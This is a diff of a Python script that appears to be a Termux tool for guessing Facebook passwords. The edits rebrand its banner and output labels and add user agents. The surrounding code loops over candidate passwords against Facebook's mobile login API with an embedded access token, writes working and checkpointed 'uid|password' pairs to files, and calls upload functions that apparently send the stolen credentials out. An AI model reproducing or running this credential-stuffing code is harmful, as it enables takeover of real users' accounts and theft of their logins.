@@ -96,11 +96,15 @@ class Main:
 			exit()
 		os.system("clear")
 		
-		print ("""\033[1;92m  ____  _   _    _    _   _ _____ ___  
- / ___|| | | |  / \  | \ | |_   _/ _ \ 
- \___ \| |_| | / _ \ |  \| | | || | | |
-  ___) |  _  |/ ___ \| |\  | | || |_| |
- |____/|_| |_/_/   \_\_| \_| |_| \___/                                        
+		print ("""\033[1;92m  _______  __      __ 
+|       \|  \    /  \
+| $$$$$$$\\$$\  /  $$
+| $$__/ $$ \$$\/  $$ 
+| $$    $$  \$$  $$  
+| $$$$$$$\   \$$$$   
+| $$__/ $$   | $$    
+| $$    $$   | $$    
+ \$$$$$$$     \$$                                            
 \033[1;90m══════════════════════════════════════════════════
 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : SHANTO HASAN   
 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : BD TERMUX ZONE
@@ -465,9 +469,11 @@ class Main:
 		ua = random.choice([
 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+			"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]"
+			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
 		])
 		sys.stdout.write(
-			"\r\r %s[>_] [SHANTO] : %s/%s -> \033[0;92m [ SHANTO-OK:%s ]- \033[0;91m[SHANTO-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s[>_] [BY] : %s/%s -> \033[0;92m [ BY-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -484,15 +490,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[SHANTO-OK] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[BY-OK] %s|%s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
-				open("ok.txt","a").write(" [SHANTO-OK] %s|%s\n"%(uid, pw))
+				open("ok.txt","a").write(" [BY-OK] %s|%s\n"%(uid, pw))
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;91m[SHANTO-CP] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;91m[BY-CP] %s|%s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write(" [SHANTO-CP] %s|%s\n"%(uid, pw))
+				open("cp.txt","a").write(" [BY-CP] %s|%s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
